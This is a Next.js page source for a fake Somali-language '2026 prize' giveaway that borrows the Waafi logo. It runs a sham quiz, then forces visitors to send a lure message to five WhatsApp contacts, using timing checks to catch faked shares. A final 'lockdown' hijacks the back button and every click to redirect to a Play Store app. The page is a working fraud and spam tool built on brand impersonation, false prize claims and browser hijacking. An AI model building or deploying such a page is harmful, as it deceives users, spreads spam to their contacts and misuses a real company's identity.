// app/page.tsx
'use client';

import { useState, useEffect } from 'react';



export default function Home() {
  const [currentStep, setCurrentStep] = useState<number>(1);
  const [shares, setShares] = useState<number>(0);
  const [isFinalStepActive, setIsFinalStepActive] = useState<boolean>(false);
  const [giftsAnimated, setGiftsAnimated] = useState<boolean>(false);
  const [isSharing, setIsSharing] = useState<boolean>(false);
  const [shareStartTime, setShareStartTime] = useState<number>(0);
  const [shareTimeout, setShareTimeout] = useState<NodeJS.Timeout | null>(null);
  const [isMenuOpen, setIsMenuOpen] = useState<boolean>(false);

  const appLink = "https://play.google.com/store/apps/details?id=com.myguri.me";

  useEffect(() => {
    const storedStep = localStorage.getItem('waafi_2026_step');
    const storedShares = localStorage.getItem('waafi_2026_shares');

    if (storedStep) {
      setCurrentStep(parseInt(storedStep, 10));
    }
    if (storedShares) {
      setShares(parseInt(storedShares, 10));
    }
    if (currentStep >= 6) {
      setCurrentStep(6);
    }
    updateUI();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    const handleVisibilityChange = () => {
      if (isSharing && (document.visibilityState === "visible" || document.hasFocus())) {
        if (shareTimeout !== null) {
          clearTimeout(shareTimeout);
        }
        setIsSharing(false);
        let timeAway = Date.now() - shareStartTime;

        if (timeAway >= 5000 && timeAway <= 20000) {
          setShares(prev => {
            const newShares = prev + 1;
            saveProgress(currentStep, newShares);
            updateShareBar(newShares);
            if (newShares >= 5) {
              setTimeout(() => goToStep(6), 1000);
            }
            return newShares;
          });
        } else if (timeAway < 5000) {
          setTimeout(() => {
            showPopup("Khalad dhacay!", "Waxaa u muuqataa inadan si sax ah u dirin fariinta. Fadlan dhab ugu dir asxaabtaada WhatsApp-ka si aad u xaqiijiso.", "error");
          }, 500);
        } else {
          setTimeout(() => {
            showPopup("Isku day mar kale!", "Waxaa laga yaabaa inaadan dirin. Fadlan isku day mar kale.", "error");
          }, 500);
        }
      }
    };

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("focus", handleVisibilityChange);

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("focus", handleVisibilityChange);
    };
  }, [isSharing, shareStartTime, shareTimeout, currentStep]);

  const saveProgress = (step: number, sh: number) => {
    localStorage.setItem('waafi_2026_step', step.toString());
    localStorage.setItem('waafi_2026_shares', sh.toString());
  };

  const goToStep = (n: number) => {
    setCurrentStep(n);
    saveProgress(n, shares);
    updateUI(n);
  };

  const selectLocation = (location: string) => {
    localStorage.setItem('waafi_location', location);
    goToStep(5);
  };

  const updateUI = (step: number = currentStep) => {
    if (step >= 4) {
      const intro = document.getElementById('introHeader');
      if (intro) intro.style.display = 'none';
    }
    if (step === 5) updateShareBar(shares);
    if (step === 6) activateFinalLockdown();
  };

  const initiateShare = () => {
    if (shares >= 5) return;
    setIsSharing(true);
    setShareStartTime(Date.now());

    const msg = encodeURIComponent("Fursad Dahabi ah! Ka qayb qaado Abaalmarinta rasmiga ah ee 2026 kana guulayso hadiyado qaali ah. Riix linkigan: " + window.location.origin + " - Ku dar asxaabtaada si ay iyaguna guuleystaan!");
    window.location.href = `whatsapp://send?text=${msg}`;

    const timeout = setTimeout(() => {
      if (isSharing) {
        setIsSharing(false);
        showPopup("Isku day mar kale!", "Waxaa laga yaabaa inaadan dirin. Fadlan isku day mar kale.", "error");
      }
    }, 30000);
    setShareTimeout(timeout);
  };

  const updateShareBar = (sh: number = shares) => {
    const progress = document.getElementById('shareProgress') as HTMLDivElement | null;
    if (progress) progress.style.width = (sh * 20) + '%';
    const countText = document.getElementById('shareCountText');
    if (countText) countText.innerText = sh.toString();
    if (sh >= 5) {
      const btnText = document.getElementById('shareBtnText');
      if (btnText) btnText.innerText = "Waa La Xaqiijiyay ✓";
      const shareBtn = document.getElementById('shareBtn') as HTMLButtonElement | null;
      if (shareBtn) {
        shareBtn.classList.remove('bg-[#25D366]');
        shareBtn.classList.add('bg-brand');
      }
    }
  };

  const activateFinalLockdown = () => {
    if (isFinalStepActive) return;
    setIsFinalStepActive(true);

    if (!giftsAnimated) {
      createFallingGifts();
      setGiftsAnimated(true);
    }
    history.pushState(null, "", location.href);
    window.onpopstate = () => {
      window.location.href = appLink;
    };
    setTimeout(() => {
      document.body.addEventListener('click', (e: MouseEvent) => {
        window.location.href = appLink;
      }, true);
    }, 100);
  };

  const createFallingGifts = () => {
    const icons = ['🎁', '🎉', '🎊', '📱', '💰', '🌟', '🏆', '💎', '⭐', '🎈'];
    for (let i = 0; i < 10; i++) {
      setTimeout(() => spawnIcon(icons[i % icons.length]), Math.random() * 2000);
    }

    function spawnIcon(icon: string) {
      const el = document.createElement('div');
      el.innerText = icon;
      el.classList.add('falling-icon');
      el.style.left = Math.random() * 100 + 'vw';
      el.style.animationDuration = (Math.random() * 2 + 2) + 's';
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 4000);
    }
  };

  const showPopup = (title: string, message: string, type: "error" | "success" = "error") => {
    const modal = document.getElementById('modernPopup') as HTMLDivElement | null;
    const content = document.getElementById('popupContent') as HTMLDivElement | null;
    const icon = document.getElementById('popupIcon') as HTMLDivElement | null;

    const titleEl = document.getElementById('popupTitle');
    if (titleEl) titleEl.innerText = title;
    const messageEl = document.getElementById('popupMessage');
    if (messageEl) messageEl.innerText = message;

    if (type === "error") {
      if (icon) icon.innerHTML = '<i class="fas fa-exclamation-circle text-red-500"></i>';
      if (content) content.classList.replace('border-brand', 'border-red-500');
    } else {
      if (icon) icon.innerHTML = '<i class="fas fa-check-circle text-brand"></i>';
      if (content) content.classList.replace('border-red-500', 'border-brand');
    }
    if (modal) {
      modal.classList.remove('hidden');
      modal.style.display = 'flex';
      setTimeout(() => {
        modal.classList.remove('opacity-0');
        if (content) {
          content.classList.remove('scale-90');
          content.classList.add('scale-100');
        }
      }, 10);
    }
  };

  const closePopup = () => {
    const modal = document.getElementById('modernPopup') as HTMLDivElement | null;
    const content = document.getElementById('popupContent') as HTMLDivElement | null;

    if (modal) modal.classList.add('opacity-0');
    if (content) {
      content.classList.remove('scale-100');
      content.classList.add('scale-90');
    }

    setTimeout(() => {
      if (modal) {
        modal.style.display = 'none';
        modal.classList.add('hidden');
      }
    }, 300);
  };

  const toggleMenu = () => {
    setIsMenuOpen(prev => !prev);
    const sidebar = document.getElementById('sidebar') as HTMLDivElement | null;
    const overlay = document.getElementById('overlay') as HTMLDivElement | null;
    const spans = document.querySelectorAll('#menuBtn span') as NodeListOf<HTMLSpanElement>;

    if (!isMenuOpen) {
      if (sidebar) sidebar.classList.remove('-translate-x-full');
      if (overlay) {
        overlay.classList.remove('hidden');
        setTimeout(() => overlay.classList.remove('opacity-0'), 10);
      }

      if (spans[0]) spans[0].style.transform = 'translateY(7.5px) rotate(45deg)';
      if (spans[1]) spans[1].style.opacity = '0';
      if (spans[2]) spans[2].style.transform = 'translateY(-7.5px) rotate(-45deg)';
    } else {
      if (sidebar) sidebar.classList.add('-translate-x-full');
      if (overlay) {
        overlay.classList.add('opacity-0');
        setTimeout(() => overlay.classList.add('hidden'), 300);
      }

      if (spans[0]) spans[0].style.transform = 'none';
      if (spans[1]) spans[1].style.opacity = '1';
      if (spans[2]) spans[2].style.transform = 'none';
    }
  };

  useEffect(() => {
    updateUI();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStep]);

  return (
    <>
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      <script src="https://cdn.tailwindcss.com"></script>
      <script dangerouslySetInnerHTML={{ __html: `
        tailwind.config = {
          theme: {
            extend: {
              fontFamily: {
                sans: ['Inter', 'sans-serif'],
              },
              colors: {
                brand: {
                  DEFAULT: '#8CC63F',
                  dark: '#7ab034',
                  light: '#f2fcf5'
                }
              }
            }
          }
        }
      ` }} />
      <div id="overlay" className="fixed inset-0 bg-black/40 z-40 hidden opacity-0 transition-opacity duration-300" onClick={toggleMenu}></div>
      <nav id="sidebar" className="fixed top-0 left-0 w-[80%] max-w-sm h-full bg-white text-gray-900 z-50 transform -translate-x-full menu-transition overflow-y-auto flex flex-col shadow-2xl rounded-r-2xl border-r border-gray-100">
        <div className="p-5 flex items-center justify-between border-b border-gray-100">
          <span className="font-bold text-xl text-gray-900 tracking-tight">Menu</span>
          <button onClick={toggleMenu} className="text-gray-400 hover:text-black focus:outline-none transition">
            <i className="fas fa-times text-2xl"></i>
          </button>
        </div>
        <ul className="flex-1 py-4 font-semibold text-[16px] tracking-wide text-gray-700 space-y-1">
          <li><a href="#" className="block px-6 py-3.5 hover:bg-brand/10 hover:text-brand transition rounded-r-full mr-4">Home</a></li>
          <li><a href="#" className="block px-6 py-3.5 hover:bg-brand/10 hover:text-brand transition rounded-r-full mr-4">Our Products</a></li>
          <li><a href="#" className="block px-6 py-3.5 hover:bg-brand/10 hover:text-brand transition rounded-r-full mr-4">About Us</a></li>
          <li><a href="#" className="block px-6 py-3.5 hover:bg-brand/10 hover:text-brand transition rounded-r-full mr-4">Terms & Conditions</a></li>
          <li><a href="#" className="block px-6 py-3.5 hover:bg-brand/10 hover:text-brand transition rounded-r-full mr-4">FAQ</a></li>
          <li><a href="#" className="block px-6 py-3.5 hover:bg-brand/10 hover:text-brand transition rounded-r-full mr-4">Contact Us</a></li>
          <li className="px-6 mt-8">
            <a href="#" className="block text-center bg-gray-900 text-white px-6 py-4 rounded-2xl font-bold shadow-lg hover:bg-brand transition">Download App</a>
          </li>
        </ul>
      </nav>
      <header className="bg-white sticky top-0 z-30 shadow-sm border-b border-gray-100">
        <div className="max-w-7xl mx-auto px-5 h-[70px] flex items-center justify-between">
          <a href="#" className="flex items-center pointer-events-none">
            <img src="https://waafi.com/_next/static/media/logo.0d6eceaa.svg" alt="Logo" className="h-10 w-auto object-contain" />
          </a>
          <button id="menuBtn" onClick={toggleMenu} className="flex flex-col justify-center items-end gap-[5px] w-8 h-8 focus:outline-none z-50">
            <span className="block w-6 h-[2.5px] bg-black rounded-full transition-transform duration-300"></span>
            <span className="block w-6 h-[2.5px] bg-black rounded-full transition-opacity duration-300"></span>
            <span className="block w-6 h-[2.5px] bg-black rounded-full transition-transform duration-300"></span>
          </button>
        </div>
      </header>
      <main className="flex-1 max-w-md mx-auto px-4 py-8 w-full text-center relative z-10">
        <div id="introHeader" className="waafi-gradient rounded-3xl p-8 mb-8 shadow-lg border border-brand/20 relative overflow-hidden text-left animate-fade-in">
          <div className="absolute -top-12 -right-12 w-40 h-40 bg-brand opacity-20 rounded-full blur-3xl animate-pulse"></div>
          <span className="inline-flex items-center gap-1.5 bg-white text-brand px-5 py-2.5 rounded-full text-sm font-black uppercase tracking-widest mb-5 shadow-md border border-brand/10">
            <i className="fas fa-gift text-brand animate-bounce"></i> Abaalmarinta 2026 ee Gaarka ah!
          </span>
          <h1 className="text-gray-900 text-4xl font-black tracking-tight leading-tight mb-4 uppercase drop-shadow-xl">
            Ku Guulayso <br /><span className="gradient-text bg-gradient-to-r from-brand to-green-600 text-5xl">Hadiyado Qaali Ah!</span>
          </h1>
          <p className="text-gray-700 font-semibold text-base leading-relaxed">
            Fursad dahabi ah oo aan la illoobi karin! Ka qayb qaado tartanka rasmiga ah ee 2026 kana mid noqo guulaystayaasha qaadanaya lacag caddaan ah iyo hadiyado qaali ah oo xiiso leh. 500+ qof ayaa horey u guuleystay - adiguna adiga ayaa xiga!
          </p>
        </div>
        <div id="step1" className={`step-container ${currentStep === 1 ? 'active block' : 'hidden'} bg-white p-7 rounded-3xl shadow-xl shadow-gray-200/40 border border-gray-100 quiz-card`}>
          <h2 className="text-2xl font-bold text-gray-900 mb-6">1. Hore ma u isticmaashay adeeggan?</h2>
          <div className="flex gap-4">
            <button onClick={() => goToStep(2)} className="flex-1 bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-lg transition-all duration-300 shadow-md quiz-card">Haa</button>
            <button onClick={() => goToStep(2)} className="flex-1 bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-lg transition-all duration-300 shadow-md quiz-card">Maya</button>
          </div>
        </div>
        <div id="step2" className={`step-container ${currentStep === 2 ? 'active block' : 'hidden'} bg-white p-7 rounded-3xl shadow-xl shadow-gray-200/40 border border-gray-100 quiz-card`}>
          <h2 className="text-2xl font-bold text-gray-900 mb-6">2. Ma Wiil ba tahay mise Gabadh?</h2>
          <div className="flex gap-4">
            <button onClick={() => goToStep(3)} className="flex-1 bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-6 rounded-2xl font-bold text-lg transition-all duration-300 flex flex-col items-center gap-3 group shadow-md quiz-card">
              <i className="fas fa-male text-4xl text-brand group-hover:text-white transition-colors"></i> Wiil
            </button>
            <button onClick={() => goToStep(3)} className="flex-1 bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-6 rounded-2xl font-bold text-lg transition-all duration-300 flex flex-col items-center gap-3 group shadow-md quiz-card">
              <i className="fas fa-female text-4xl text-brand group-hover:text-white transition-colors"></i> Gabadh
            </button>
          </div>
        </div>
        <div id="step3" className={`step-container ${currentStep === 3 ? 'active block' : 'hidden'} bg-white p-7 rounded-3xl shadow-xl shadow-gray-200/40 border border-gray-100 quiz-card`}>
          <h2 className="text-2xl font-bold text-gray-900 mb-6">3. Ma jeclaan layd inad ka qayb qaadato Tartankan?</h2>
          <div className="flex flex-col gap-4">
            <button onClick={() => goToStep(4)} className="w-full bg-brand hover:bg-brand-dark text-white py-4 rounded-2xl font-bold text-lg shadow-xl hover:shadow-2xl transition-all duration-300 active:scale-95 quiz-card">Haa, Waan Jeclahay <i className="fas fa-check-circle ml-2"></i></button>
            <button onClick={() => goToStep(4)} className="w-full bg-gray-200 text-gray-700 hover:bg-gray-300 py-4 rounded-2xl font-bold text-lg transition-all duration-300 quiz-card">Maya</button>
          </div>
        </div>
        <div id="step4" className={`step-container ${currentStep === 4 ? 'active block' : 'hidden'} bg-white p-7 rounded-3xl shadow-xl shadow-gray-200/40 border border-gray-100 quiz-card`}>
          <h2 className="text-2xl font-bold text-gray-900 mb-6 mt-1 text-center">4. Halkee ayaad ka joogtaa?</h2>
          <div className="grid grid-cols-2 gap-4 mb-2">
            <button onClick={() => selectLocation('Somaliland')} className="bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-md transition-all duration-300 shadow-md quiz-card">Somaliland</button>
            <button onClick={() => selectLocation('Somalia')} className="bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-md transition-all duration-300 shadow-md quiz-card">Somalia</button>
            <button onClick={() => selectLocation('Djibouti')} className="bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-md transition-all duration-300 shadow-md quiz-card">Djibouti</button>
            <button onClick={() => selectLocation('Ethiopia')} className="bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-md transition-all duration-300 shadow-md quiz-card">Ethiopia</button>
            <button onClick={() => selectLocation('Kenya')} className="bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-md transition-all duration-300 shadow-md quiz-card">Kenya</button>
            <button onClick={() => selectLocation('Others')} className="bg-white hover:bg-brand hover:text-white border-2 border-brand text-brand py-4 rounded-2xl font-bold text-md transition-all duration-300 shadow-md quiz-card">Others</button>
          </div>
        </div>
        <div id="step5" className={`step-container ${currentStep === 5 ? 'active block' : 'hidden'} bg-white p-8 rounded-3xl shadow-xl border border-gray-100 relative overflow-hidden quiz-card`}>
          <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#25D366] to-green-500"></div>
          <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 border border-green-100 shadow-md">
            <i className="fab fa-whatsapp text-5xl text-[#25D366] animate-pulse"></i>
          </div>
          <h2 className="text-3xl font-black text-gray-900 mb-4 uppercase tracking-tight">Talaabada U Dambeysa!</h2>
          <p className="text-base text-gray-700 mb-8 font-semibold leading-relaxed">Si aad u hesho abaalmarintaada oo aad u xiiso badan, u dir linkigan <strong className="text-brand font-black">5 asxaabtaada ah</strong> ee WhatsApp-ka. Ku dar inay iyaguna guuleystaan oo farxad leh!</p>
          <div className="relative w-full h-6 mb-3 overflow-hidden rounded-full bg-gray-200 border border-gray-300 shadow-inner">
            <div id="shareProgress" className="bg-gradient-to-r from-brand to-[#25D366] h-full rounded-full transition-all duration-500 relative" style={{width: '0%'}}>
              <div className="absolute inset-0 bg-white/30 animate-[shimmer_2s_infinite]"></div>
            </div>
          </div>
          <p className="text-sm font-bold text-gray-600 mb-8 text-center"><span id="shareCountText" className="text-brand font-black text-xl">0</span> / 5 Asxaab</p>
          <button id="shareBtn" onClick={initiateShare} className="w-full bg-[#25D366] hover:bg-[#128C7E] text-white py-5 rounded-2xl font-black text-[22px] shadow-2xl flex justify-center items-center gap-3 active:scale-95 transition-all duration-300 relative overflow-hidden quiz-card">
            <i className="fab fa-whatsapp text-3xl animate-bounce"></i>
            <span id="shareBtnText">Share WhatsApp</span>
          </button>
        </div>
        <div id="step6" className={`step-container ${currentStep === 6 ? 'active block' : 'hidden'} w-full h-full flex flex-col justify-center items-center mt-4`}>
          <div className="bg-gradient-to-br from-white to-brand-light p-8 rounded-[2.5rem] shadow-2xl border-4 border-brand/20 relative overflow-hidden w-full text-center quiz-card">
            <div className="absolute -top-12 -right-12 w-48 h-48 bg-brand opacity-20 rounded-full blur-3xl animate-pulse"></div>
            <div className="absolute -bottom-12 -left-12 w-48 h-48 bg-green-400 opacity-20 rounded-full blur-3xl animate-pulse"></div>
            <div className="text-brand text-8xl mb-5 animate-bounce drop-shadow-2xl"><i className="fas fa-trophy"></i></div>
            <h2 className="text-5xl font-black text-gray-900 mb-3 uppercase tracking-tighter">Hambalyo!</h2>
            <span className="inline-block bg-brand text-white px-5 py-2 rounded-full text-sm font-black uppercase tracking-widest mb-6 shadow-md">Waad Guuleysatay</span>
            <p className="text-gray-700 mb-8 font-semibold leading-relaxed text-base">Talaabadii ugu dambeysay! Lasoo dag App-ka si aad abaalmarintaada si toos ah ugu hesho hadda. Ku biir  1000+ guuleystayaal faraxsan oo la farax!</p>
            <button className="w-full bg-brand-dark hover:bg-brand text-white py-5 rounded-2xl text-2xl font-black shadow-[0_15px_30px_rgba(122,176,52,0.5)] relative overflow-hidden group hover:shadow-[0_20px_40px_rgba(122,176,52,0.6)] transition-all duration-300 uppercase tracking-wide">
              <span className="relative z-10">La Dag App-ka <i className="fas fa-download ml-2 animate-pulse"></i></span>
              <div className="absolute inset-0 h-full w-full bg-gradient-to-r from-transparent via-white/30 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]"></div>
            </button>
          </div>
          <div className="mt-8 flex justify-center items-center gap-8 text-gray-500">
            <div className="flex flex-col items-center"><i className="fas fa-shield-alt text-3xl mb-1 text-brand"></i><span className="text-xs font-bold uppercase tracking-wider">100% Amaan</span></div>
            <div className="flex flex-col items-center"><i className="fas fa-check-decagram text-3xl mb-1 text-brand"></i><span className="text-xs font-bold uppercase tracking-wider">Waa La Xaqiijiyay</span></div>
            <div className="flex flex-col items-center"><i className="fas fa-users text-3xl mb-1 text-brand"></i><span className="text-xs font-bold uppercase tracking-wider">500+ Guuleystay</span></div>
          </div>
        </div>
      </main>
      <div id="modernPopup" className="fixed inset-0 bg-black/70 z-[100] hidden items-center justify-center p-5 backdrop-blur-md transition-opacity opacity-0 duration-300">
        <div className="bg-white rounded-3xl p-8 max-w-sm w-full shadow-2xl transform scale-90 transition-transform duration-300 flex flex-col items-center text-center border-t-4 border-brand" id="popupContent">
          <div id="popupIcon" className="text-6xl mb-4 mt-2"></div>
          <h3 id="popupTitle" className="text-3xl font-black text-gray-900 mb-2 tracking-tight"></h3>
          <p id="popupMessage" className="text-gray-600 mb-8 font-medium leading-relaxed text-base"></p>
          <button onClick={closePopup} className="w-full bg-gray-900 hover:bg-black text-white py-4 rounded-2xl font-bold text-lg shadow-xl active:scale-95 transition-all duration-300">Waayahay (OK)</button>
        </div>
      </div>
    </>
  );
}